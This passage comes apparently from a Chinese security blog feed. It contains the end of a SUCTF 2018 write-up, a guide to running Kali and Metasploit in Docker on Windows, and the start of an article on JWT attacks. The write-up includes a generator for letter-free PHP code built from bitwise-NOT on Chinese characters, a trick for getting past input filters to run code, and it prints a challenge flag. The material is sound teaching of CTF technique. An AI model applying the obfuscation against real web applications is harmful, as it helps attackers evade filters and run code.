class="string">"如是我闻。一时薄伽梵。住王舍城鹫峰山顶。与大苾刍众千二百五十人俱。皆阿罗汉。诸漏已尽无复烦恼得真自在心善解脱慧善解脱。如调慧马亦如大龙。已作所作已办所办。弃诸重担逮得己利。尽诸有结正知解脱。至心自在第一究竟。除阿难陀独居学地得预流果。大迦叶波而为上首。复有五百苾刍尼众。皆阿罗汉。大胜生主而为上首。复有无量邬波索迦、邬波斯迦。皆见圣谛。复有无量无数菩萨摩诃萨众。一切皆得陀罗尼门三摩地门。住空无相无分别愿。已得诸法平等性忍。具足成就四无碍解。凡所演说辩才无尽。于五神通自在游戏。所证智断永无退失。言行威肃闻皆敬受。勇猛精进离诸懈怠。能舍亲财不顾身命。离矫离诳无染无求。等为有情而宣正法。契深法忍穷最极趣。得无所畏其心泰然。超众魔境出诸业障。摧灭一切烦恼怨敌。建正法幢伏诸邪论。声闻独觉不能测量。得心自在得法自在。业惑见障皆已解脱。择法辩说无不善巧。入深缘起生灭法门。离见随眠舍诸缠结。智慧通达诸圣谛理。曾无数劫发弘誓愿。容貌熙怡先言接引。远离颦蹙辞韵清和。赞颂善巧辩才无滞。处无边众威德肃然。抑扬自在都无所畏。多俱胝劫巧说无尽。于诸法门胜解观察。如幻如阳焰。如梦如水月。如响如空花。如像如光影。如变化事。如寻香城。虽皆无实而现似有。离下劣心说法无畏。能随证入无量法门。善知有情心行所趣。以微妙慧而度脱之。于诸有情心无挂碍。成就最上无生法忍。善入诸法平等性智。甚深法性能如实知。随其所应巧令悟入。能善宣说缘起法门。摄受无边佛国大愿。于十方界无数诸佛。等持正念常现在前。诸佛出世皆能历事。亦能劝请转正法轮。不般涅槃度无量众善能伏灭一切有情种种见缠诸烦恼焰。须臾游戏百千等持。引发无边殊胜功德。此诸菩萨具如是等妙功德海。设经无量俱胝大劫。叹不能尽。其名曰贤守菩萨摩诃萨。宝性菩萨摩诃萨。宝藏菩萨摩诃萨。宝授菩萨摩诃萨。导师菩萨摩诃萨。仁授菩萨摩诃萨。星授菩萨摩诃萨。神授菩萨摩诃萨。帝授菩萨摩诃萨。广慧菩萨摩诃萨。胜慧菩萨摩诃萨。上慧菩萨摩诃萨。增长慧菩萨摩诃萨。无边慧菩萨摩诃萨。不虚见菩萨摩诃萨。无障慧菩萨摩诃萨。善发趣菩萨摩诃萨。善勇猛菩萨摩诃萨。极精进菩萨摩诃萨。常精进菩萨摩诃萨。常加行菩萨摩诃萨。不舍轭菩萨摩诃萨。日藏菩萨摩诃萨。月藏菩萨摩诃萨。无比慧菩萨摩诃萨。观自在菩萨摩诃萨。得大势菩萨摩诃萨。妙吉祥菩萨摩诃萨。宝印手菩萨摩诃萨。摧魔力菩萨摩诃萨。金刚慧菩萨摩诃萨。金刚藏菩萨摩诃萨。常举手菩萨摩诃萨。大悲心菩萨摩诃萨。大庄严菩萨摩诃萨。庄严王菩萨摩诃萨。山峰菩萨摩诃萨。宝峰菩萨摩诃萨。德王菩萨摩诃萨。慈氏菩萨摩诃萨。如是等无量百千俱胝那庾多菩萨摩诃萨。皆法王子堪绍佛位而为上首。尔时世尊于师子座上。自敷尼师坛结跏趺坐。端身正愿住对面念。入等持王妙三摩地。诸三摩地皆摄入此三摩地中。是所流故。尔时世尊正知正念。从等持王安庠而起。以净天眼观察十方殑伽沙等诸佛世界。举身怡悦。从两足下千辐轮相。各放六十百千俱胝那庾多光。从足十指。两趺两跟。四踝两胫。两腨两膝。两股。腰胁腹背。脐中心上胸臆德字。两乳两腋。两肩两髆。两肘两臂。两腕两手。两掌十指。项咽颐颔。颊额头顶两眉两眼。两耳两鼻。口四牙。四十齿。眉间毫相。一一身分。各放六十百千俱胝那庾多光。此一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊一切毛孔皆悉熙怡。各出六十百千俱胝那庾多光。是一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊演身常光照此三千大千世界。从此展转遍照十方殑伽沙等诸佛国土。其中有情遇斯光者。必得无上正等菩提。尔时世尊从其面门出广长舌相。遍覆三千大千世界。熙怡微笑。复从舌相流出无量百千俱胝那庾多光。其光杂色。从此杂色一一光中。现宝莲花。其花千叶皆真金色。众宝庄严。绮饰鲜荣。甚可爱乐。香气芬烈。周流普熏。细滑轻软。触生妙乐。诸花台中皆有化佛结跏趺坐。演妙法音。一一法音。皆说般若波罗蜜多相应之法。有情闻者必得无上正等菩提。从此展转。流遍十方殑伽沙等诸佛世界。说法利益亦复如是。"</span></span><br><span class="line">    parse_byte=<span class="keyword">lambda</span> c:[~i%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> bytes(c, encoding=<span class="string">'utf-8'</span>)][<span class="number">1</span>]</span><br><span class="line">    d=dict()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> sentence:</span><br><span class="line">        j=parse_byte(k)</span><br><span class="line">        <span class="keyword">if</span> chr(j) <span class="keyword">in</span> target_chars <span class="keyword">and</span> chr(j) <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">            d[chr(j)]=<span class="string">"~&#123;&#125;[&#123;&#125;]"</span>.format(k,index)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gencode</span><span class="params">(code)</span>:</span></span><br><span class="line">    d=gendict(index=<span class="string">'$_'</span>,target_chars=<span class="string">''</span>.join(set(code)))</span><br><span class="line">    res=<span class="string">'$__='</span>+<span class="string">'.'</span>.join(map(<span class="keyword">lambda</span> x:d[x],code))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=<span class="string">'@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span></span><br><span class="line">print(gencode(code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?php </span></span><br><span class="line"><span class="comment"># $_=_==_;</span></span><br><span class="line"><span class="comment"># $__=~俱[$_].~得[$_].~住[$_].~伽[$_].~结[$_].~二[$_].~鹫[$_].~一[$_].~已[$_].~足[$_].~流[$_].~索[$_].~峰[$_].~精[$_].~山[$_].~尽[$_].~诸[$_].~宣[$_].~正[$_].~第[$_].~竟[$_].~誓[$_].~马[$_].~言[$_].~解[$_].~如[$_].~神[$_].~大[$_].~声[$_].~梵[$_].~顶[$_].~堪[$_].~城[$_].~果[$_].~坛[$_].~真[$_].~相[$_].~皆[$_].~百[$_].~是[$_].~闻[$_].~薄[$_].~数[$_].~生[$_].~响[$_].~和[$_].~摩[$_].~萨[$_].~叶[$_].~王[$_].~千[$_].~猛[$_].~苾[$_].~办[$_].~所[$_].~我[$_].~自[$_].~熙[$_].~慧[$_].~脱[$_].~烦[$_].~邬[$_].~恼[$_];</span></span><br><span class="line"><span class="comment"># var_dump($__);</span></span><br><span class="line"><span class="comment"># // string(63) "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>把magic视为256x256的由0，1组成的矩阵M，把cipher视为256x1的矩阵C，把key视为256x1的矩阵K，已知M,C，且M*K = C (.mod 2)，求K。</p><p>可以采用<code>Gauss-Jordan 消元法</code> 将增广矩阵<code>[M|C]</code> 简化为行阶梯形矩阵，那么变化后的C就是我们的解K。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">read_to_int_array = <span class="keyword">lambda</span> x:[map(int,list(bin(int(line,<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> open(x).readlines()]</span><br><span class="line">cipher = read_to_int_array(<span class="string">'cipher.txt'</span>)[<span class="number">0</span>]</span><br><span class="line">magic = read_to_int_array(<span class="string">'magic.txt'</span>)</span><br><span class="line">dim=len(cipher)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> range(dim):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(col,dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span>:</span><br><span class="line">            magic[col],magic[row]=magic[row],magic[col]</span><br><span class="line">            cipher[col],cipher[row]=cipher[row],cipher[col]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span> <span class="keyword">and</span> row!=col:</span><br><span class="line">            <span class="keyword">for</span> each_in_row <span class="keyword">in</span> range(dim):</span><br><span class="line">                magic[row][each_in_row]^=magic[col][each_in_row]</span><br><span class="line">            cipher[row]^=cipher[col]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%hex(int(<span class="string">''</span>.join(map(str,cipher)),<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#flag&#123;Now_you_know_the_Hill_Cipher_xwg&#125;</span></span><br></pre></td></tr></table></figure><p>参考链接：</p><ul><li><a href="https://blog.csdn.net/u010182633/article/details/45225179" target="_blank" rel="noopener">https://blog.csdn.net/u010182633/article/details/45225179</a> </li><li><a href="https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP" target="_blank" rel="noopener">https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP</a> </li><li>也可尝试借助matlab的 <a href="https://ww2.mathworks.cn/help/matlab/ref/rref.html" target="_blank" rel="noopener">rref</a> 。</li></ul><h1 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h1><p><a href="https://github.com/findneo/ctfgodown/tree/master/20180527-suctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180527-suctf</a>    </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>在win10家庭版上的Docker中使用Kali</title>
      <link href="/180512KalionDocker/"/>
      <url>/180512KalionDocker/</url>
      
        <content type="html"><![CDATA[<p><strong>全程需保证保证网络畅通</strong></p><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><ul><li><p>从 <a href="https://docs.docker.com/toolbox/toolbox_install_windows/" target="_blank" rel="noopener">https://docs.docker.com/toolbox/toolbox_install_windows/</a> 下载DockerToolbox.exe 。关闭其他程序，右键管理员运行，选项可全部保持默认（如果电脑上未安装Git，在安装过程中需注意勾选）。</p></li><li><p>桌面可看到名为<code></code>Docker Quickstart Terminal`的快捷方式，右键管理员运行，<strong>等待直到</strong>出现<strong>可交互命令行</strong>。</p></li></ul><h2 id="修改默认存储位置到非系统盘"><a href="#修改默认存储位置到非系统盘" class="headerlink" title="修改默认存储位置到非系统盘"></a>修改默认存储位置到非系统盘</h2><ul><li><p>在上一步出现的<strong>可交互命令行界面</strong>运行 <code>docker-machine.exe stop default</code> 关闭基础虚拟机。</p></li><li><p>运行桌面上名为<code>Oracle VM VirtualBox</code> 的快捷方式。</p><ul><li>在<code>管理-&gt;虚拟介质管理器【CTRL+D】</code> 中复制<code>disk.vmdk</code> 到D盘 ，注意最好保持vmdk 格式。</li><li>选中<code>default</code> 虚拟机，右键<code>设置-&gt;存储-&gt;控制器：SATA-&gt;添加虚拟硬盘</code> 中添加D盘的<code>disk.vmdk</code> 。删除C盘的<code>disk.vmdk</code> 。保存设置。</li></ul></li><li><p>回到 命令行，运行<code>docker-machine.exe start default</code> 启动基础虚拟机。</p></li></ul><h1 id="下载Kali基础镜像并配置容器"><a href="#下载Kali基础镜像并配置容器" class="headerlink" title="下载Kali基础镜像并配置容器"></a>下载Kali基础镜像并配置容器</h1><ul><li><p>（<strong>以下命令均在上述命令行中输入</strong>）</p></li><li><p><code>docker pull  kalilinux/kali-linux-docker</code>  拉取Kali基础镜像，约700+M。</p></li><li><p><code>docker run -it --name kali kalilinux/kali-linux-docker /bin/bash</code> 基于该镜像启动一个容器并命名为<code>kali</code> 。</p></li><li><p><code>apt update &amp;&amp; apt full-upgrade &amp;&amp; apt auto-remove &amp;&amp; apt-autoclean</code> 安装工具前的准备工作。此处是<strong>一小段等待</strong>。</p></li><li><p><code>apt install kali-linux-all</code> 安装Kali的工具包。此处是<strong>漫长等待</strong>。 如果报错按错误提示操作即可。</p></li></ul><h2 id="配置msf数据库"><a href="#配置msf数据库" class="headerlink" title="配置msf数据库"></a>配置msf数据库</h2><ul><li><p><code>service postgresql start</code></p></li><li><p><code>su postgres</code></p></li><li><p><code>createuser username -P</code> 设置数据库用户账户密码</p></li><li><p><code>createdb --owner=username dbname &amp;&amp; exit</code>  创建数据库</p></li><li><p><code>cd /usr/share/metasploit-framework/config &amp;&amp; cp database.yml.example database.yml &amp;&amp; vi database.yml</code>  填好username,pass,dbname  。</p></li><li><p><code>msfconsole</code> </p><ul><li><code>db_status</code>  查看数据库连接状态</li><li><code>db_connect username:password@localhost/dbname</code>  //若没成功连接数据库，则手动连接</li></ul></li></ul><h1 id="常用基本操作"><a href="#常用基本操作" class="headerlink" title="常用基本操作"></a>常用基本操作</h1><h2 id="数据管理"><a href="#数据管理" class="headerlink" title="数据管理"></a>数据管理</h2><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul><li><code>docker cp  kali:/root/testfile testfile</code> </li><li><code>docker cp test kali:/root/test</code> </li></ul><h3 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h3><ul><li><code>docker volume create my-vol</code> </li><li><code>docker volume ls</code></li><li><code>docker run --mount source=my-vol,target=/webapp ...</code> </li><li>对应目录是default虚拟机的<code>/var/lib/docker/volumes/my-vol</code> ，并不能直接操作，理论上应该先在虚拟机和主机间共享文件夹，然后再使用数据卷。</li></ul><h3 id="挂载主机目录"><a href="#挂载主机目录" class="headerlink" title="挂载主机目录"></a>挂载主机目录</h3><ul><li><code>docker run --mount type=bind,source=/src/webapp,target=/opt/webapp ...</code>  </li></ul><h2 id="对镜像-image-的操作"><a href="#对镜像-image-的操作" class="headerlink" title="对镜像(image)的操作"></a>对镜像(image)的操作</h2><ul><li><p><code>docker search kali</code> 在线搜索镜像。</p></li><li><p><code>docker pull kalilinux/kali-linux-docker</code>  下载镜像。</p></li><li><p><code>docker image ls [-a]</code> 列出本地镜像。</p></li><li><p><code>docker image rm kalilinux/kali-linux-docker</code>   删除本地镜像。</p></li><li><p><code>docker commit -a findneo -m &quot;kali-all-tools installed;msfdb configured&quot; kali findneo/kali:v1</code> 生成镜像</p></li><li><p>保存与加载本地镜像</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">findneo/kali                  v1                  16b856910432        About an hour ago   13.2GB</span><br><span class="line">kalilinux/kali-linux-docker   latest              b8fe82f15421        2 months ago        749MB</span><br><span class="line"></span><br><span class="line">docker save -o D:\findneoandOriginKali.tar findneo/kali:v1 kalilinux/kali-linux-docker</span><br><span class="line">docker load -i D:\findneoandOriginKali.tar</span><br></pre></td></tr></table></figure></li></ul><h2 id="对容器-container-的操作"><a href="#对容器-container-的操作" class="headerlink" title="对容器(container)的操作"></a>对容器(container)的操作</h2><ul><li><code>docker run --rm kalilinux/kali-linux-docker /bin/echo &quot;hi&quot;</code><br>以<code>kalilinux/kali-linux-docker</code> 镜像为基础启动一个新的容器，执行命令<code>/bin/echo &quot;hi&quot;</code> ，退出、终止并删除容器。</li><li><p><code>docker run -it --name kali kalilinux/kali-linux-docker /bin/bash</code><br>以<code>kalilinux/kali-linux-docker</code> 镜像为基础启动一个新的容器，命名为<code>kali</code> ，提供bash终端 。执行<code>exit</code> 将退出、终止但保留容器。</p></li><li><p><code>docker start kali</code>   启动名为<code>kali</code> 的容器并在后台运行，<strong>相当于开机</strong> 。<br><code>docker exec -it kali bash</code>   进入<code>kali</code> 的bash终端。执行<code>exit</code> 将退出但不终止容器。<br><code>docker stop kali</code>    终止名为<code>kali</code> 的容器，<strong>相当于关机</strong> 。</p></li><li><p><code>docker container ls -a</code> 列出所有容器，不带<code>-a</code> 参数仅列出当前运行中的容器。<br><code>docker container rm kali</code> 删除指定容器。若容器正在运行需加<code>--force</code> 参数。</p></li><li><p><code>docker container export -o D:\mykaliv1.tar kali</code> 导出容器，<strong>相当于拍摄快照</strong> 。<br><code>docker import D:\mykaliv1.tar- test/kali:v1</code>  导入容器，<strong>相当于还原快照</strong> 。</p></li></ul><h1 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h1><ul><li>参考：<a href="https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file</a> </li></ul><h2 id="扩容磁盘"><a href="#扩容磁盘" class="headerlink" title="扩容磁盘"></a>扩容磁盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">关闭容器和default虚拟机</span><br><span class="line">docker stop kali</span><br><span class="line">docker-machine srop</span><br><span class="line">扩容磁盘</span><br><span class="line"><span class="built_in">cd</span> C:\Program Files\Oracle\VirtualBox</span><br><span class="line">VBoxManage clonehd <span class="string">"D:\vmac\dockerMachine\disk.vmdk"</span> <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> --format vdi</span><br><span class="line">VBoxManage modifyhd <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> --resize 204800</span><br><span class="line">VBoxManage clonehd <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> <span class="string">"D:\vmac\dockerMachine\resized.vmdk"</span> --format vmdk</span><br></pre></td></tr></table></figure><h2 id="调整分区"><a href="#调整分区" class="headerlink" title="调整分区"></a>调整分区</h2><ul><li>从 <a href="https://gparted.sourceforge.io/download.php" target="_blank" rel="noopener">https://gparted.sourceforge.io/download.php</a> 下载gparted-live-0.31.0-1-amd64.iso。</li><li>在default虚拟机设置面板的<code>存储-&gt;控制器-&gt;添加虚拟光驱</code> 中将gparted-live-0.31.0-1-amd64.iso 加到SATA0端口，使其开机第一个启动。移除原有磁盘，将扩容后的磁盘放在原来磁盘的位置。</li><li><code>启动-&gt;无界面启动</code>  ，使用GParted 调整磁盘空间。Apply。双击桌面<code>EXIT</code> ，选择shutdown退出，按右CTRL键使焦点回到主机<br><img src="1526135602464.png" alt="1526135602464"></li><li>恢复虚拟机存储设置至下入状态<br><img src="1526142367100.png" alt="1526142367100"></li></ul><h2 id="查看调整分区是否成功"><a href="#查看调整分区是否成功" class="headerlink" title="查看调整分区是否成功"></a>查看调整分区是否成功</h2><ul><li><p><code>docker-machine start default</code> </p></li><li><p><code>docker-machine ssh default</code> 进入default虚拟机的shell，去看看分区扩容是否成功</p></li><li><p>查看并记录当前状态</p><ul><li><code>fdisk -l</code></li><li><code>df -h</code></li><li><code>cat /etc/fstab</code>   (/boot/grub/menu.lst文件没找到)</li></ul></li><li><p>对比前后状态可以看到已经成功了<br><img src="1526100195018.png" alt="1526100195018"><br><img src="1526137337445.png" alt="1526137337445"></p></li></ul><h2 id="Partition-table-entries-are-not-in-disk-order"><a href="#Partition-table-entries-are-not-in-disk-order" class="headerlink" title="Partition table entries are not in disk order"></a>Partition table entries are not in disk order</h2><p><code>fdisk -l</code> 出现<code>Partition table entries are not in disk order</code> 问题。字面上看是分区表和硬盘分区不一致。查资料据说不影响，不过还是试着解决下。</p><ul><li>参考链接<ul><li><a href="https://ubuntuforums.org/showthread.php?t=1252662" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=1252662</a></li><li><a href="https://blog.csdn.net/wujiangguizhen/article/details/22857667" target="_blank" rel="noopener">https://blog.csdn.net/wujiangguizhen/article/details/22857667</a></li></ul></li><li>操作步骤<ul><li><code>docker-machine ssh default</code></li><li><code>sudo -i</code> 切换到root权限  (<a href="https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password" target="_blank" rel="noopener">https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password</a>)</li><li><code>fdisk /dev/sda</code><ul><li><code>x</code> 进入专家模式</li><li><code>f</code> fix partition order</li><li><code>w</code> 写入变化</li></ul></li><li><img src="1526137422738.png" alt="1526137422738"></li><li>解决后分区状态如下。对比上图可以发现sda1和sda2互换了。<br><img src="1526142973113.png" alt="1526142973113"></li></ul></li></ul><h1 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h1><p>参考链接：</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzAwNTQ3NQ==&amp;mid=209866190&amp;idx=1&amp;sn=0ee75509eb2fab454009125e0a8c6437" target="_blank" rel="noopener">【微信分享】林帆：Docker运行GUI软件的方法</a> </li><li><a href="http://www.cnblogs.com/starspace/archive/2009/02/13/1390062.html" target="_blank" rel="noopener">shell中获取本机ip地址</a> </li><li><a href="https://superuser.com/questions/325630/how-can-i-export-display-from-a-linux-terminal-to-a-windows-pc" target="_blank" rel="noopener">How can I export DISPLAY from a Linux terminal to a Windows PC?</a> </li><li><a href="https://blog.csdn.net/dream_broken/article/details/52414560" target="_blank" rel="noopener">docker学习8–同主机下容器通信</a> </li><li><a href="https://askubuntu.com/questions/432255/what-is-the-display-environment-variable" target="_blank" rel="noopener">What is the $DISPLAY environment variable?</a> </li><li><a href="https://stackoverflow.com/questions/24095968/docker-for-gui-based-environments" target="_blank" rel="noopener">Docker for GUI-based environments?</a> </li><li><a href="https://stackoverflow.com/questions/16296753/can-you-run-gui-apps-in-a-docker-container" target="_blank" rel="noopener">Can you run GUI apps in a docker container?</a></li></ul><p>大致理解Docker网络结构和XX转发流程</p><p><img src="1526182398234.png" alt="1526182398234"></p><p>启动一个新配制参数的容器，将主机上X11的unix套接字共享到kali容器里面 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it  -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix  -e DISPLAY=<span class="string">"192.168.233.101:0.0"</span>  -e GDK_SCALE  -e GDK_DPI_SCALE --name gkali findneo/kali:v1 bash</span><br></pre></td></tr></table></figure><p>在<code>Setting-&gt;Configuration</code> 里取消MobaXterm的X server的访问控制。</p><p><img src="1526182806764.png" alt="1526182806764"></p><p>启动容器即可使用GUI。可以使用<code>xcal,xclock,xedit,xmessage,xeyes,xmessage</code> 等等小程序测试X11转发是否正常工作（<code>ls /usr/bin/x*</code> 可以看到更多）</p><p><img src="1526182630443.png" alt="1526182630443"></p><h2 id="SSH-连入"><a href="#SSH-连入" class="headerlink" title="SSH 连入"></a>SSH 连入</h2><p>从容器访问主机可以直接使用主机的IP地址（<code>ipconfig</code>），从主机访问容器实际上是访问<code>boot2docker</code> 虚拟机的IP （<code>docker-machine.exe ssh default &quot;/sbin/ifconfig eth1|sed -n &#39;/inet addr/s/^[^:]*:\([0-9.]\{7,15\}\) .*/\1/p&#39;&quot;</code>）和启动容器时配置的转发端口 （<code>docker run -p 12345:22 ...</code> ）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所以理论上这样启动一个容器既可以SSH连入，又可以使用图形界面。</span><br><span class="line">docker run -it  -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix  -e DISPLAY=<span class="string">"192.168.233.101:0.0"</span>  -e GDK_SCALE  -e GDK_DPI_SCALE -p 52023:22 --name kali findneo/kali:v2</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a>  </li><li><a href="https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/positivesecurity/2017/09/01/setting-up-kali-linux-in-docker-on-windows-10/</a>   </li><li><a href="https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password" target="_blank" rel="noopener">https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password</a> </li><li><a href="https://ubuntuforums.org/showthread.php?t=1252662" target="_blank" rel="noopener">https://ubuntuforums.org/showthread.php?t=1252662</a><ul><li><a href="https://blog.csdn.net/wujiangguizhen/article/details/22857667" target="_blank" rel="noopener">https://blog.csdn.net/wujiangguizhen/article/details/22857667</a> </li><li><a href="https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file</a> </li></ul></li></ul><blockquote><p>容器不应该是长久性的东西，要保持容器的可抛弃性，有问题就应该rm掉，数据保存在容器外，然后直接run新的容器。 ——<a href="http://www.talkwithtrend.com/Question/233635" target="_blank" rel="noopener">http://www.talkwithtrend.com/Question/233635</a> </p></blockquote><p>看到上面这个，感觉自己的用法可能有点奇怪：）</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>JSON Web Token的认识与攻击</title>
      <link href="/180503jwt/"/>
      <url>/180503jwt/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首发  <a href="http://www.freebuf.com/column/170359.html" target="_blank" rel="noopener">Freebuf</a>   。略有更新。</strong>  </p><h1 id="0x01-初识JWT"><a href="#0x01-初识JWT" class="headerlink" title="0x01 初识JWT"></a>0x01 初识JWT</h1><p>JWT （ <code>JSON Web Token</code> 的缩写）是一串带有声明信息的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。</p><p>JWT 由三部分构成，分别称为 <code>header</code> 、<code>payload</code> 和 <code>signature</code> ，各部分用<code>.</code> 相连构成一个完整的Token，形如<code>xxxxx.yyyyy.zzzzz</code> 。</p><p>分别看下各个部分：</p><p><strong>header</strong> ：</p><p>使用一个JSON格式字符串声明token的类型和签名用的算法等，形如<code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}</code> 。该字符串经过Base64Url编码后形成JWT的第一部分<code>xxxxx</code>。</p><p>Base64Url编码可以用这段代码直观理解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64URLen</span><span class="params">(s)</span>:</span></span><br><span class="line">t0=b64encode(s)</span><br><span class="line">t1=t0.strip(<span class="string">'='</span>).replace(<span class="string">'+'</span>,<span class="string">'-'</span>).replace(<span class="string">'/'</span>,<span class="string">'_'</span>)</span><br><span class="line"><span class="keyword">return</span> t1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64URLde</span><span class="params">(s)</span>:</span></span><br><span class="line">t0=s.replace(<span class="string">'-'</span>,<span class="string">'+'</span>).replace(<span class="string">'_'</span>,<span class="string">'/'</span>)</span><br><span class="line">t1=t0+<span class="string">'='</span>*(<span class="number">4</span>-len(t0)%<span class="number">4</span>)%<span class="number">4</span></span><br><span class="line"><span class="keyword">return</span> b64decode(t1)</span><br></pre></td></tr></table></figure><p><strong>payload</strong> :</p><p>使用一个JSON格式字符串描述所要声明的信息，分为 <code>registered</code> 、<code>public</code> 、 和 <code>private</code> 三类，形如<code>{&quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true}</code> ，具体信息可参考 <a href="https://tools.ietf.org/html/rfc7519#section-4" target="_blank" rel="noopener">RFC7519 的 JWT claims</a> 部分。</p><p>同样的，该字符串经过Base64Url编码形成JWT的第二部分<code>yyyyy</code>。</p><p><strong>signature</strong> :</p><p>将 <code>xxxxx.yyyyy</code> 使用<code>alg</code> 指定的算法加密，然后再Base64Url编码得到JWT的第三部分<code>zzzzz</code> 。所支持的算法 类型取决于实现，但<code>HS256</code> 和 <code>none</code> 是强制要求实现的。</p><h1 id="0x02-简单应用"><a href="#0x02-简单应用" class="headerlink" title="0x02 简单应用"></a>0x02 